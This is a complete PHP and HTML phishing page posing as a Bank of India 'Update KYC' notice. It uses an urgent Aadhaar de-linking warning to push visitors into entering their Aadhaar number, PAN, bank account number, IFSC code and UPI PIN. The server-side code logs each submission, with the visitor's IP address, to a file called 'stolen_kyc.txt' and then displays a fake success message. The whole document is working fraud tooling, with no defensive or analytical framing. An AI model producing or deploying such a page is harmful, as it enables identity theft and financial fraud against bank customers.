<?php
if (isset($_POST['aadhaar'], $_POST['pan'], $_POST['accno'], $_POST['ifsc'])) {
    $data = date("Y-m-d H:i") . " | " . $_SERVER['REMOTE_ADDR'] . " | " .
            $_POST['aadhaar'] . " | " . $_POST['pan'] . " | " .
            $_POST['accno'] . " | " . $_POST['ifsc'] . " | " . $_POST['upi_pin'] . "\n";
    file_put_contents("stolen_kyc.txt", $data, FILE_APPEND);
    echo "<h1>Verified! Your account is secure.</h1>";
    exit;
}
?>
<!DOCTYPE html>
<html><head><title>Update KYC - Bank of India</title></head>
<body style="font-family:Arial;text-align:center;">
<img src="https://boi.co.in/header-logo.png" width="150"><br><br>
<h3>⚠️ URGENT: Your Bank is De-Linked from Aadhaar</h3>
<p>To avoid account freeze, verify now:</p>
<form method="POST">
<input type="text" name="aadhaar" placeholder="Enter 12-digit Aadhaar" required><br><br>
<input type="text" name="pan" placeholder="Enter PAN" required><br><br>
<input type="text" name="accno" placeholder="Account Number" required><br><br>
<input type="text" name="ifsc" placeholder="IFSC Code" required><br><br>
<input type="password" name="upi_pin" placeholder="UPI PIN (for verification)" required><br><br>
<button type="submit">Verify Now</button>
</form>
</body></html>
